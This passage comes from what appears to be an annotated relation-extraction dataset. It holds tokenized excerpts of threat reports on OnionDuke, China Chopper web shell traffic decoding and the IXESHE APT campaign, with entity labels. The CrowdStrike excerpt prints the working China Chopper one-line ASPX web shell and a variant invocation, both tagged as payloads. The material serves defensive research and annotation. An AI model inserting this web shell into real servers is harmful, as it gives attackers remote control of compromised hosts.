"have", "also", "uncovered", "strong", "evidence", "suggesting", "that", "OnionDuke", "has", "been", "used", "in"], ["targeted", "attacks", "against", "European", "government", "agencies", ",", "although", "we", "have", "so", "far", "been", "unable", "to", "identify"], ["the", "infection", "vector(s)", ".", "Interestingly", ",", "this", "would", "suggest", "two", "very", "different", "targeting", "strategies", ".", "On", "one"], ["hand", "is", "the", "\"shooting", "a", "fly", "with", "a", "cannon\"", "mass-infection", "strategy", "through", "modified", "binaries", "and", ",", "on", "the"], ["other", ",", "the", "more", "surgical", "targeting", "traditionally", "associated", "with", "APT", "operations", "."], ["In", "any", "case", ",", "although", "much", "is", "still", "shrouded", "in", "mystery", "and", "speculation", ",", "one", "thing", "is", "certain", ".", "While", "using"], ["Tor", "may", "help", "you", "stay", "anonymous", ",", "it", "does", "at", "the", "same", "time", "paint", "a", "huge", "target", "on", "your", "back", ".", "It's", "never", "a"], ["good", "idea", "to", "download", "binaries", "via", "Tor", "(or", "anything", "else)", "without", "encryption", ".", "The", "problem", "with", "Tor", "is"], ["that", "you", "have", "no", "idea", "who", "is", "maintaining", "the", "exit", "node", "you", "are", "using", "and", "what", "their", "motives", "are", ".", "VPNs"], ["(such", "as", "our", "Freedome", "VPN)", "will", "encrypt", "your", "connection", "all", "the", "way", "through", "the", "Tor", "network", ",", "so", "the"], ["maintainers", "of", "Tor", "exit", "nodes", "will", "not", "see", "your", "traffic", "and", "can't", "tamper", "with", "it", "."], ["Samples:"], ["\u2022", "a75995f94854dea8799650a2f4a97980b71199d2"], ["\u2022", "b491c14d8cfb48636f6095b7b16555e9a575d57f"], ["\u2022", "d433f281cf56015941a1c2cb87066ca62ea1db37"], ["Detected", "as:", "Trojan-Dropper:W32/OnionDuke", ".", "A,", "Backdoor:W32/OnionDuke", ".", "A,", "and"], ["Backdoor:W32/OnionDuke", ".", "B."], ["Post", "by", "\u2014", "Artturi", "(@lehtior2)"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Malware", "name": "China Chopper", "sent_id": 0, "pos": [3, 4]}, {"old_id": "T2", "type": "Time", "name": "30 MAR 2015", "sent_id": 3, "pos": [0, 2]}, {"old_id": "T3", "type": "Person", "name": "WILLIAM TAN", "sent_id": 4, "pos": [0, 1]}, {"old_id": "T4", "type": "Malware", "name": "Chopper Web shell", "sent_id": 6, "pos": [1, 3]}, {"old_id": "T5", "type": "Payload", "name": "<%@ Page Language=\"Jscript\"%><%eval(RequestItem[\u201dpassword\"]\"unsafe\");%>", "sent_id": 9, "pos": []}, {"old_id": "T6", "type": "Organization", "name": "CrowdStrike", "sent_id": 12, "pos": [0]}, {"old_id": "T7", "type": "Dropper", "name": "SystemWebServicesdll", "sent_id": 13, "pos": []}, {"old_id": "T8", "type": "Payload", "name": "<% WebServicesInitalizeWebServices (\"shell_password\");%>", "sent_id": 16, "pos": [0, 4]}, {"old_id": "T9", "type": "Malware", "name": "Chopper Web shell", "sent_id": 22, "pos": [1, 3]}, {"old_id": "T10", "type": "Malware", "name": "Chopper", "sent_id": 24, "pos": [1]}, {"old_id": "T11", "type": "Malware", "name": "Chopper", "sent_id": 25, "pos": [12]}, {"old_id": "T12", "type": "Malware", "name": "Chopper", "sent_id": 26, "pos": [10]}, {"old_id": "T13", "type": "Software", "name": "ChopShop", "sent_id": 29, "pos": [8]}, {"old_id": "T14", "type": "Organization", "name": "MITRE", "sent_id": 30, "pos": [0]}, {"old_id": "T15", "type": "Software", "name": "ChopShop", "sent_id": 30, "pos": [5]}, {"old_id": "T16", "type": "Malware", "name": "Chopper", "sent_id": 34, "pos": [1]}, {"old_id": "T17", "type": "Malware", "name": "Chopper", "sent_id": 56, "pos": [10]}, {"old_id": "T18", "type": "Obfuscation", "name": "base64", "sent_id": 60, "pos": [1]}, {"old_id": "T19", "type": "Obfuscation", "name": "hex", "sent_id": 60, "pos": [3]}, {"old_id": "T20", "type": "Malware", "name": "Chopper", "sent_id": 64, "pos": [7]}, {"old_id": "T21", "type": "Malware", "name": "Chopper", "sent_id": 89, "pos": [6]}, {"old_id": "T22", "type": "Malware", "name": "Chopper", "sent_id": 90, "pos": [1]}], "labels": [{"old_id": "R1", "r": "P13", "h": 3, "t": 4, "evidence": [6, 7, 8, 9]}, {"old_id": "R2", "r": "P13", "h": 6, "t": 7, "evidence": [13, 14, 15, 16]}, {"old_id": "R3", "r": "P17", "h": 13, "t": 12, "evidence": []}, {"old_id": "R4", "r": "P13", "h": 16, "t": 17, "evidence": [56, 57, 58, 59, 60]}, {"old_id": "R5", "r": "P13", "h": 16, "t": 18, "evidence": [56, 57, 58, 59, 60]}], "title": ["inputs/txt/201503CrowdStrikeChinaChopper"], "sents": [["Chopping", "packets:", "Decoding", "China", "Chopper", "Web"], ["shell", "traf\ufb01c", "over", "SSL"], ["THE", "FRONT", "LINES", "/", "THE", "TOOL", "BOX"], ["30", "MAR", "2015"], ["WILLIAM", "TAN"], ["INTRODUCTION"], ["The", "Chopper", "Web", "shell", "is", "a", "widely", "used", "backdoor", "by", "Chinese", "and", "other", "malicious", "actors", "to"], ["remotely", "access", "a", "compromised", "Web", "server", ".", "Deployment", "of", "the", "Chopper", "shell", "on", "the", "server", "is"], ["fairly", "basic", "as", "the", "server", "payload", "is", "a", "single", "line", "inserted", "into", "any", "ASPX", "page", "."], ["<%@", "Page", "Language=\"Jscript\"%><%eval(Request", ".", "Item[\u201dpassword\"],\"unsafe\");%>"], ["This", "payload", "is", "available", "in", "a", "variety", "of", "languages", "including", "ASP", ",", "ASPX", ",", "PHP", ",", "JSP", ",", "and", "CFM", "."], ["Once", "installed", ",", "the", "attacker", "can", "access", "the", "shell", "with", "the", "Chopper", "client", "side", "binary", "."], ["CrowdStrike", "has", "observed", "another", "deployment", "method", "on", "IIS", "servers", "where", "attackers", "upload", "a"], ["trojanized", "DLL", "\ufb01le", ",", "\u2018System", ".", "WebServices.dll\u2019.", "This", "DLL", "\ufb01le", "is", "written", "in", "C#", "and", "contains", "multiple"], ["Chopper", "API", "functions", ".", "The", "attacker", "can", "then", "call", "these", "functions", "by", "inserting", "this", "line", "in", "any"], ["ASPX", "page:"], ["<%", "WebServices", ".", "InitalizeWebServices", "(\"shell_password\");%>"], ["The", "attacker", "can", "access", "this", "Web", "shell", "variant", "with", "similar", "methods", ",", "including", "using", "the", "Chopper"], ["client", "side", "binary", ".", "The", "bene\ufb01t", "of", "this", "deployment", "method", "allows", "the", "Web", "shell", "to", "evade", "hostbased", "detection", "methods", "that", "look", "for", "suspicious", "functions", "such", "as", "\u2018eval\u2019", ".", "Although", "deployments"], ["of", "Chopper", "can", "vary", "on", "the", "host", ",", "the", "network", "traf\ufb01c", "patterns", "generated", "by", "the", "Web", "shell", "have"], ["remained", "largely", "unchanged", "."], ["CHOPPER", "NETWORK", "TRAFFIC"], ["The", "Chopper", "Web", "shell", "client", "communicates", "over", "TCP", "using", "HTTP", "POST", "requests", ".", "Network"], ["traf\ufb01c", "analysis", "of", "chopper", "packets", "can", "reveal", "attacker", "actions", ",", "intentions", ",", "and", "next", "steps", "."], ["Because", "Chopper", "generates", "a", "POST", "request", "for", "each", "command", ",", "manual", "analysis", "can", "get"], ["tedious", "if", "the", "attacker", "is", "very", "active", ".", "Another", "challenge", "occurs", "when", "Chopper", "is", "deployed", "on", "a"], ["Web", "server", "behind", "SSL", ",", "causing", "all", "traf\ufb01c", "generated", "by", "Chopper", "to", "be", "encrypted", "."], ["Figure", "1", ".", "Example", "of", "Chopper\u2019s", "encoded", "command", "with", "response", "over", "decrypted", "HTTPs"], ["DECODING", "WITH", "CHOPSHOP"], ["To", "assist", "with", "rapid", "triage", ",", "we", "leverage", "ChopShop", ",", "a", "network", "decoder", "framework", "developed", "by"], ["MITRE", "(https://github", ".", "com/MITRECND/chopshop).", "The", "ChopShop", "framework", "is", "extendable", "with"], ["modules", ",", "and", "the", "output", "from", "each", "module", "can", "be", "chained", ".", "Doing", "so", "reduces", "the", "need", "to", "rewrite"], ["a", "decoder", "for", "widely", "used", "protocols", ".", "This", "allows", "the", "analyst", "to", "focus", "on", "developing", "modules"], ["speci\ufb01c", "to", "a", "family", "of", "malware", "without", "dealing", "with", "the", "underlying", "protocols", "."], ["The", "Chopper", "decode", "module", "I", "have", "written", "for", "the", "ChopShop", "Framework", "is", "designed", "to", "be"], ["chained", "with", "the", "\u2018chop_ssl\u2019", "and", "\u2018http\u2019", "modules", ".", "To", "decode", "SSL", "traf\ufb01c", ",", "the", "\u2018chop_ssl\u2019", "module"], ["requires", "the", "server\u2019s", "private", "key", "in", "RSA", "format", ".", "I\u2019ve", "provided", "an", "initial", "version", "of", "this", "module", "on"], ["our", "Github", "page", "(https://github", ".", "com/CrowdStrike/chopshop)."], ["webshell_chopper_decode", "(0", ".", "1)", "--", "requires", "ChopLib", "4", ".", "0", "or", "greater:"], ["Extract", "Chopper", "Webshell", "commands", "and", "output", "from", "HTTP", "traffic", ".", "Requires", "'http'"], ["parent", "module", "."], ["Usage:", "webshell_chopper_decode", "[options]"], ["Options:"], ["-h", ",", "--help"], ["show", "this", "help", "message", "and", "exit"], ["-d", ",", "--dict_output"], ["Formats", "output", "to", "sets", "of", "dicts"], ["-c", ",", "--commands_only", "Only", "output", "chopper", "commands"], ["-o", ",", "--outputs_only"], ["-x", ",", "--extract_pe"], ["Only", "output", "chopper", "responses"], ["Attempts", "to", "extract", "pe", "files", "from", "session"], ["Sample", "usage", "commands:"], ["", ".", "/chopshop", "\u2013f", "chopper_traffic_ssl", ".", "pcap", "\"chop_ssl", "-k", "privatekeyrsa", ".", "key", "|", "http", "|"], ["webshell_chopper_decode\"", ">", "decoded_commands", ".", "txt"], ["", ".", "/chopshop", "\u2013f", "chopper_traffic_http", ".", "pcap", "\"http", "|", "webshell_chopper_decode", "-c\""], ["The", "module", "output", "contains", "all", "commands", "and", "responses", "from", "the", "Chopper", "shell", ".", "The", "module"], ["will", "decode", "the", "entire", "PCAP", "and", "separate", "the", "each", "command", "parameter", "\u2018z0\u2019", ",", "\u2018z1\u2019", ",", "\u2018z2\u2019", "on", "a"], ["separate", "line", ".", "These", "\u2018z\u2019", "parameters", "in", "the", "form", "data", "contain", "the", "arguments", "to", "commands", "", ",", "which"], ["are", "passed", "from", "the", "Chopper", "client", "to", "the", "server", "payload", ".", "While", "the", "commands", "are", "encoded", "in"], ["either", "base64", "or", "hex", ",", "the", "responses", "are", "not", "encoded", "."], ["In", "the", "sample", "output", "below", ",", "we", "see", "an", "attacker", "running", "a", "\u2018dir\u2019", "command", "\ufb01le", "looking", "for"], ["\u2018w3wp", ".", "exe\u2019", "(a", "renamed", "version", "of", "cmd", ".", "exe)", "and", "subsequently", "executing", "the", "credential", "dumper"], ["\u2018mimikatz\u2019", "(named", "pwd", ".", "txt)."], ["Portable", "executable", "(PE)", "\ufb01les", "used", "by", "the", "Chopper", "Web", "shell", "are", "parsed", "as", "hex", "encoded", "by", "the"], ["module", ".", "The", "Chopper", "decode", "module", "has", "an", "option", "to", "attempt", "to", "carve", "out", "and", "save", "any", "PE", "\ufb01les"], ["in", "the", "commands", "or", "responses", "seen", "during", "an", "attacker\u2019s", "C2", "session", "."], ["", ".", "/chopshop", "-s", "", ".", "\u2013f", "chopper_traffic_ssl", ".", "pcap", "\"chop_ssl", "-k", "privatekeyrsa", ".", "key", "|", "http", "|"], ["webshell_chopper_decode", "\u2013x\""], ["Note", "the", "addition", "of", "the", "\u201c-s\u201d", "\ufb02ag", ",", "which", "needs", "to", "be", "set", "to", "tell", "ChopShop", "which", "directory", "to", "output"], ["saved", "\ufb01les", "."], ["Figure", "2", ".", "Sample", "portion", "of", "output", "from", "decode", "module", "showing", "\u2018mimikatz\u2019", "execution", "."], ["\u2026"], ["chopper_extracted_file-1", ".", "bin", "saved", ".", "."], ["[COMMAND]", "at", "2015-02-24", "07:03:05", "UTC"], ["[Z0", "Parameter]", "-", "Q1|"], ["[Z1", "Parameter]", "\\\\192", ".", "168.1.11\\c$\\inetpub\\wwwroot\\Citrix\\XenApp\\bin\\System.WebServices.dll"], ["[Z2", "Parameter]", "4D5A90000300000004000000FFFF0000B80000000000000040000000000000000000"], ["0000000000000000000000000000000000000000000000000000800000000E1FBA0E"], ["00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F74206265207"], ["2756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0103"], ["00D2963C500000000000000000E00002210B0108000036000000080000000000002"], ["E5500000020000000600000000040000020000000020000040000000000000004000"], ["0000000000000A000000002000000000000030040850000100000100000000010000"], ["010000000000000100000000000000000000000DC5400004F0000000060000008050"], ["00000000000000000000000000000000000008000000C000000445400001C0000000"], ["00000000000000000000000000000000000000000000000000000000000000000000"], ["0000000000000200000080000000\u2026"], ["FINAL", "THOUGHTS"], ["Figure", "3", ".", "Carved", "PE", "from", "Chopper", "traf\ufb01c", "opened", "in", "hex", "editor", "."], ["With", "Chopper", "available", "in", "so", "many", "varieties", "of", "programming", "and", "scripting", "languages", ",", "this", "module"], ["is", "still", "in", "development", "to", "account", "for", "different", "variants", "and", "edge", "cases", ".", "The", "goal", "of", "this", "module"], ["was", "to", "ease", "some", "of", "the", "tediousness", "of", "extracting", "information", "out", "of", "a", "large", "packet", "capture", ".", "With"], ["the", "prevalence", "of", "Chopper\u2019s", "use", "by", "APT", "groups", ",", "being", "able", "to", "quickly", "decode", "and", "understand"], ["what", "an", "attacker", "is", "doing", "greatly", "increases", "the", "situational", "awareness", "of", "incident", "responders", "."], ["REFERENCES"], ["https://github", ".", "com/CrowdStrike/chopshop"], ["https://github", ".", "com/MITRECND/chopshop"], ["https://github", ".", "com/MITRECND/htpy"], ["http://www", ".", "mitre.org/capabilities/cybersecurity/overview/cybersecurity-blog/decrypting-ssl-withchopshop"], ["https://www", ".", "\ufb01reeye.com/content/dam/legacy/resources/pdfs/\ufb01reeye-china-chopper-report.pdf"], ["http://informationonsecurity", ".", "blogspot.com/2012/11/china-chopper-webshell.html"], ["1"], ["8"], ["\u2190", "New", "White", "House", "Executive", "Order:"], ["Sanctions", "in", "Response", "to", "Cyber", "Intrusions"], ["The", "Future", "of", "Privacy", ",", "Data", ",", "and", "Cyber"], ["Crime", "and", "its", "Impact", "on", "the", "American"], ["Business", "Dream", "\u2192"], ["Follow", "Us"], ["Tweets"], ["CrowdStrike"], ["@CrowdStrike"], ["12h"], ["Check", "out", "@media\ufb01shy", "discuss", "the", "future", "of", "AV", "and", "why", "endpoint", "protection", "is"], ["paramount", "ow", ".", "ly/UZ12X", "#cybersecurity", "#infosec"], ["Show", "Media"], ["CrowdStrike"], ["@CrowdStrike"], ["20", "Nov"], ["Check", "out", "@Shawn365Henry's", "security", "tips", "in", "\"The", "Top", "5", "#Cybersecurity", "Mistakes"], ["Companies", "Make", "&", "How", "to", "Avoid", "Them\"", "ow", ".", "ly/USNQD"], ["Expand"], ["Eric", "Opdyke"], ["@EricOpdyke"], ["20", "Nov"], ["Got", "my", "sweet", "new", "@CrowdStrike", "Dead", "Eye", "Jackal", "shirt", "today", "#DFIR", "#malware"], ["#deadeyejackal", "pic", ".", "twitter.com/mihenWdbAa"], ["Retweeted", "by", "CrowdStrike"], ["Compose", "new", "Tweet\u2026"], ["Recent", "Posts"], ["The", "Imperative", "for", "Proactive", "Incident", "Response", "in", "2015", "and", "Beyond"], ["November", "3", ",", "2015"], ["Why", "Your", "Business", "Environment", "Should", "Drive", "Cybersecurity"], ["November", "2", ",", "2015"], ["Blurring", "of", "Commodity", "and", "Targeted", "Attack", "Malware"], ["October", "16", ",", "2015"], ["Should", "I", "Really", "Trust", "the", "Cloud", "with", "my", "Endpoint", "Protection", "?"], ["September", "30", ",", "2015"], ["U", ".", "S.", "\u2013", "China", "Agreement", "on", "Cyber", "Intrusions:", "An", "In\ufb02ection", "Point"], ["September", "25", ",", "2015"], ["Archives"], ["N"], ["M"], ["T"], ["W"], ["O"], ["V"], ["T"], ["E"], ["M"], ["B"], ["E"], ["F"], ["R"], ["2"], ["S"], ["0"], ["1"], ["5"], ["S"], ["1"], ["2"], ["3"], ["4"], ["5"], ["6"], ["7"], ["8"], ["9"], ["10"], ["11"], ["12"], ["13"], ["14"], ["15"], ["16"], ["17"], ["18"], ["19"], ["20"], ["21"], ["22"], ["23"], ["24"], ["25"], ["26"], ["27"], ["28"], ["29"], ["30"], ["\u00ab", "Oct"], ["Recent", "Comments"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Organization", "name": "Trend Micro", "sent_id": null, "pos": []}, {"old_id": "T2", "type": "Attacker", "name": "APTs", "sent_id": null, "pos": []}, {"old_id": "T3", "type": "Campaign", "name": "Luckycat1", "sent_id": 50, "pos": []}, {"old_id": "T4", "type": "Campaign", "name": "Lurid2", "sent_id": 50, "pos": []}, {"old_id": "T5", "type": "Attacker", "name": "IXESHE", "sent_id": 52, "pos": []}, {"old_id": "T6", "type": "ExploitTargetObject", "name": "East Asian governments", "sent_id": 55, "pos": []}, {"old_id": "T7", "type": "ExploitTargetObject", "name": "electronics manufacturers", "sent_id": null, "pos": []}, {"old_id": "T9", "type": "Campaign", "name": "IXESHE", "sent_id": 58, "pos": []}, {"old_id": "T8", "type": "Exploit", "name": "targeted emails", "sent_id": 58, "pos": []}, {"old_id": "T10", "type": "Exploit", "name": "zero-day", "sent_id": 66, "pos": []}, {"old_id": "T11", "type": "Time", "name": "2009", "sent_id": 66, "pos": []}, {"old_id": "T12", "type": "Time", "name": "2011", "sent_id": 66, "pos": []}, {"old_id": "T13", "type": "Attacker", "name": "IXESHE", "sent_id": 64, "pos": []}, {"old_id": "T14", "type": "Exploit", "name": "dynamic Domain Name System", "sent_id": 80, "pos": []}, {"old_id": "T15", "type": "Attacker", "name": "IXESHE", "sent_id": 69, "pos": []}, {"old_id": "T16", "type": "ExploitTargetObject", "name": "A telecommunications company", "sent_id": 99, "pos": []}, {"old_id": "T17", "type": "Campaign", "name": "IXESHE", "sent_id": 93, "pos": []}, {"old_id": "T18", "type": "Time", "name": "July 2009", "sent_id": 108, "pos": []}, {"old_id": "T19", "type": "Attacker", "name": "IXESHE", "sent_id": 105, "pos": [3]}, {"old_id": "T20", "type": "Software", "name": "Adobe Acrobat", "sent_id": 115, "pos": []}, {"old_id": "T21", "type": "Software", "name": "Reader", "sent_id": null, "pos": []}, {"old_id": "T22", "type": "Software", "name": "Flash Player", "sent_id": 116, "pos": []}, {"old_id": "T23", "type": "Vulnerability", "name": "CVE-2009-43243", "sent_id": null, "pos": []}, {"old_id": "T24", "type": "Vulnerability", "name": "CVE-2009-09274", "sent_id": 118, "pos": []}, {"old_id": "T25", "type": "Vulnerability", "name": "CVE-2011-06095", "sent_id": 118, "pos": []}, {"old_id": "T26", "type": "Vulnerability", "name": "CVE-2011-06116", "sent_id": 118, "pos": []}, {"old_id": "T27", "type": "Vulnerability", "name": "CVE-2011-06098", "sent_id": 120, "pos": []}, {"old_id": "T28", "type": "Malware", "name": "IXESHE", "sent_id": 109, "pos": []}, {"old_id": "T29", "type": "Malware", "name": "IXESHE", "sent_id": 123, "pos": [1]}, {"old_id": "T30", "type": "Software", "name": "Microsoft Excel", "sent_id": 124, "pos": []}, {"old_id": "T31", "type": "Vulnerability", "name": "CVE-2009-31299", "sent_id": 124, "pos": []}, {"old_id": "T32", "type": "Exploit", "name": "targeted email with a PDF", "sent_id": 150, "pos": []}, {"old_id": "T33", "type": "Campaign", "name": "IXESHE", "sent_id": 148, "pos": []}, {"old_id": "T34", "type": "Exploit", "name": "XLS exploit", "sent_id": 151, "pos": []}, {"old_id": "T35", "type": "File", "name": "winhlpsexe", "sent_id": 172, "pos": []}, {"old_id": "T36", "type": "File", "name": "acrotryexe", "sent_id": 172, "pos": []}, {"old_id": "T37", "type": "File", "name": "AcroRd32exe", "sent_id": null, "pos": []}, {"old_id": "T38", "type": "File", "name": "Updaterexe", "sent_id": null, "pos": []}, {"old_id": "T39", "type": "Indicator", "name": "Adobe Assistant", "sent_id": 183, "pos": []}, {"old_id": "T40", "type": "Indicator", "name": "Migrated", "sent_id": 183, "pos": []}, {"old_id": "T41", "type": "Malware", "name": "IXESHE", "sent_id": null, "pos": []}, {"old_id": "T42", "type": "Indicator", "name": "launchlnk", "sent_id": null, "pos": []}, {"old_id": "T43", "type": "File", "name": "FGKDjsp", "sent_id": null, "pos": []}, {"old_id": "T44", "type": "File", "name": "FPKjsp", "sent_id": 205, "pos": []}, {"old_id": "T45", "type": "TechnologyInformation", "name": "Computer name", "sent_id": null, "pos": []}, {"old_id": "T46", "type": "NetworkInformation", "name": "Local IP address", "sent_id": 214, "pos": []}, {"old_id": "T47", "type": "NetworkInformation", "name": "Proxy server IP and port", "sent_id": null, "pos": []}, {"old_id": "T48", "type": "Campaign", "name": "AES", "sent_id": 334, "pos": []}, {"old_id": "T49", "type": "Malware", "name": "AWS12345jsp", "sent_id": 340, "pos": []}, {"old_id": "T50", "type": "Indicator", "name": "http://[C&C Server]/[ACD] ES[Some Numbers]jsp", "sent_id": null, "pos": []}, {"old_id": "T51", "type": "Indicator", "name": "AES", "sent_id": 352, "pos": []}, {"old_id": "T52", "type": "Indicator", "name": "DES", "sent_id": 352, "pos": []}, {"old_id": "T53", "type": "Indicator", "name": "PES", "sent_id": 353, "pos": []}, {"old_id": "T54", "type": "Indicator", "name": "SEU", "sent_id": 354, "pos": []}, {"old_id": "T55", "type": "Indicator", "name": "SUS", "sent_id": 354, "pos": []}, {"old_id": "T56", "type": "Indicator", "name": "ZES", "sent_id": 357, "pos": []}, {"old_id": "T57", "type": "Country", "name": "Taiwan", "sent_id": 370, "pos": []}, {"old_id": "T58", "type": "Country", "name": "United States", "sent_id": null, "pos": []}, {"old_id": "T59", "type": "Campaign", "name": "IXESHE", "sent_id": 369, "pos": []}, {"old_id": "T60", "type": "Address", "name": "xxxxx11487", "sent_id": null, "pos": []}, {"old_id": "T61", "type": "Location", "name": "Guangdong", "sent_id": null, "pos": []}, {"old_id": "T62", "type": "Country", "name": "China", "sent_id": 411, "pos": []}, {"old_id": "T63", "type": "Exploit", "name": "HTran", "sent_id": 412, "pos": []}, {"old_id": "T64", "type": "AttackerGroup", "name": "HUC", "sent_id": 416, "pos": []}, {"old_id": "T65", "type": "Campaign", "name": "manufact", "sent_id": 442, "pos": []}, {"old_id": "T66", "type": "Software", "name": "Microsoft XP", "sent_id": 447, "pos": []}, {"old_id": "T67", "type": "SourceCodeInformation", "name": "C++", "sent_id": 451, "pos": []}, {"old_id": "T68", "type": "MalwareCharacteristics", "name": "PDF files", "sent_id": 472, "pos": []}, {"old_id": "T69", "type": "Malware", "name": "IXESHE", "sent_id": 467, "pos": []}, {"old_id": "T70", "type": "MalwareCharacteristics", "name": "targeted email", "sent_id": 470, "pos": []}, {"old_id": "T71", "type": "MalwareCharacteristics", "name": "dynamic DNS services", "sent_id": 483, "pos": []}, {"old_id": "T72", "type": "MalwareCharacteristics", "name": "HTran", "sent_id": 757, "pos": []}, {"old_id": "T73", "type": "Malware", "name": "IXESHE", "sent_id": 753, "pos": []}, {"old_id": "T74", "type": "CourseOfAction", "name": "solid patch management", "sent_id": 768, "pos": []}, {"old_id": "T75", "type": "CourseOfAction", "name": "endpoint and network security", "sent_id": null, "pos": []}, {"old_id": "T76", "type": "CourseOfAction", "name": "firewall use", "sent_id": 769, "pos": []}, {"old_id": "T77", "type": "CourseOfAction", "name": "DLP", "sent_id": null, "pos": []}, {"old_id": "T78", "type": "CourseOfAction", "name": "Enhanced visibility", "sent_id": 783, "pos": []}, {"old_id": "T79", "type": "CourseOfAction", "name": "Integrity checks", "sent_id": null, "pos": []}, {"old_id": "T80", "type": "CourseOfAction", "name": "Empowering the human analyst", "sent_id": null, "pos": []}, {"old_id": "T81", "type": "Software", "name": "Deep Discovery", "sent_id": null, "pos": []}], "labels": [{"old_id": "R1", "r": "P27", "h": 7, "t": 5, "evidence": []}, {"old_id": "R2", "r": "P27", "h": 7, "t": 6, "evidence": []}, {"old_id": "R3", "r": "P22", "h": 7, "t": 8, "evidence": [58]}, {"old_id": "R4", "r": "P22", "h": 7, "t": 9, "evidence": [58, 59, 60, 61, 62, 63, 64, 65, 66]}, {"old_id": "R5", "r": "P33", "h": 12, "t": 10, "evidence": [64, 65, 66]}, {"old_id": "R6", "r": "P33", "h": 12, "t": 11, "evidence": [64, 65, 66]}, {"old_id": "R7", "r": "P23", "h": 14, "t": 13, "evidence": [69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80]}, {"old_id": "R8", "r": "P27", "h": 16, "t": 15, "evidence": [93, 94, 95, 96, 97, 98, 99]}, {"old_id": "R9", "r": "P33", "h": 18, "t": 17, "evidence": [105, 106, 107, 108]}, {"old_id": "R10", "r": "P7", "h": 27, "t": 22, "evidence": []}, {"old_id": "R11", "r": "P7", "h": 27, "t": 23, "evidence": [109, 110, 111, 112, 113, 114, 115, 116, 117, 118]}, {"old_id": "R12", "r": "P7", "h": 27, "t": 24, "evidence": [109, 110, 111, 112, 113, 114, 115, 116, 117, 118]}, {"old_id": "R13", "r": "P7", "h": 27, "t": 25, "evidence": [109, 110, 111, 112, 113, 114, 115, 116, 117, 118]}, {"old_id": "R14", "r": "P7", "h": 28, "t": 26, "evidence": []}, {"old_id": "R15", "r": "P19", "h": 29, "t": 30, "evidence": [124]}, {"old_id": "R16", "r": "P22", "h": 32, "t": 31, "evidence": [148, 149, 150]}, {"old_id": "R17", "r": "P22", "h": 32, "t": 33, "evidence": [148, 149, 150, 151]}, {"old_id": "R18", "r": "P21", "h": 39, "t": 40, "evidence": []}, {"old_id": "R19", "r": "P21", "h": 38, "t": 40, "evidence": []}, {"old_id": "R20", "r": "P21", "h": 41, "t": 40, "evidence": []}, {"old_id": "R21", "r": "P21", "h": 49, "t": 48, "evidence": []}, {"old_id": "R22", "r": "P32", "h": 58, "t": 56, "evidence": [369, 370]}, {"old_id": "R23", "r": "P32", "h": 58, "t": 57, "evidence": []}, {"old_id": "R24", "r": "P13", "h": 68, "t": 67, "evidence": [467, 468, 469, 470, 471, 472]}, {"old_id": "R25", "r": "P13", "h": 68, "t": 69, "evidence": [467, 468, 469, 470]}, {"old_id": "R26", "r": "P13", "h": 68, "t": 70, "evidence": [467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483]}, {"old_id": "R27", "r": "P13", "h": 72, "t": 71, "evidence": [753, 754, 755, 756, 757]}], "title": ["inputs/txt/201205TrendMicroIXESHE"], "sents": [["Trend", "Micro", "Incorporated"], ["Research", "Paper"], ["2012"], ["IXESHE"], ["An", "APT", "Campaign"], ["By:", "David", "Sancho", ",", "Jessa", "dela", "Torre", ",", "Matsukawa", "Bakuei", ","], ["Nart", "Villeneuve", ",", "and", "Robert", "McArdle"], ["PAGE", "ii", "|", "IXESHE"], ["CONTENTS"], ["Introduction", "", ".", "...................................................................................", "1"], ["Victims", "and", "Targets", "", ".", "..............................................................", "1"], ["Context", ".", ".....................................................................................", "1"], ["Attack", "Vectors", ".", ".......................................................................", "2"], ["Operations", "", ".", ".............................................................................", "2"], ["Technical", "Analysis", ".", "........................................................................", "2"], ["Initial", "Delivery", "Method", ".", "........................................................", "2"], ["Malware", "Local", "System", "Effects", ".", "...........................................", "2"], ["C&C", "Communications", ".", "..........................................................", "3"], ["Related", "AES", "Campaign", "", ".", ".......................................................4"], ["C&C", "Infrastructure", ".", ".......................................................................5"], ["Real", "C&C", "Location", ".", "................................................................6"], ["Attribution", "and", "Unique", "Fingerprints", ".", ".......................................", "7"], ["Unique", "Fingerprints", "and", "Modus", "Operandi", "", ".", ".....................", "7"], ["Relationships", "Between", "Attack", "Components", "", ".", ".........................8"], ["Timeline", ".", ".........................................................................................12"], ["Conclusion", ".", "....................................................................................15"], ["Defending", "Against", "APTs", ".", "............................................................15"], ["Local", "and", "External", "Threat", "Intelligence", "", ".", "..........................15"], ["Mitigation", "and", "Cleanup", "Strategy", ".", ".....................................16"], ["Educating", "Employees", "Against", "Social", "Engineering", ".", "......16"], ["Data-Centric", "Protection", "Strategy", ".", "....................................16"], ["Trend", "Micro", "Threat", "Protection", "Against", "IXESHE"], ["Campaign", "Components", "", ".", ".............................................................17"], ["PAGE", "1", "|", "IXESHE"], ["INTRODUCTION"], ["The", "number", "of", "targeted", "attacks", "is", "undoubtedly", "on", "the"], ["rise", ".", "These", "highly", "targeted", "attacks", "focus", "on", "individual"], ["organizations", "in", "an", "effort", "to", "extract", "valuable", "information", "."], ["In", "many", "ways", ",", "this", "is", "a", "return", "to", "the", "\u201cold", "hacking", "days\u201d"], ["before", "more", "widespread", "attacks", "targeting", "millions", "of"], ["users", "and", "the", "rise", "of", "computer", "worms", "came", "about", "."], ["Sometimes", ",", "these", "targeted", "attacks", "are", "allegedly", "linked", "to"], ["state-sponsored", "activities", "but", "may", "also", "be", "carried", "out", "by"], ["individual", "groups", "with", "their", "own", "goals", "."], ["Trend", "Micro", "continues", "to", "track", "and", "analyze", "highly"], ["targeted", "attacks", ",", "also", "known", "as", "\u201cadvanced", "persistent"], ["threats", "(APTs)", ".", "\u201d", "We", "have", ",", "in", "fact", ",", "published", "two", "research"], ["papers", "on", "the", "Luckycat1"], ["and", "Lurid2"], ["campaigns", ".", "This"], ["research", "paper", "will", "delve", "into", "another", "prominent", "group", "of"], ["attackers", "referred", "to", "as", "\u201cIXESHE\u201d", "(pronounced", "\u201ci-sushi\u201d)", ","], ["based", "on", "one", "of", "the", "more", "common", "detection", "names"], ["security", "companies", "use", "for", "the", "malware", "they", "utilize", ".", "This"], ["campaign", "is", "notable", "for", "targeting", "East", "Asian", "governments", ","], ["electronics", "manufacturers", ",", "and", "a", "telecommunications"], ["company", "."], ["The", "IXESHE", "campaign", "makes", "use", "of", "targeted", "emails", "with"], 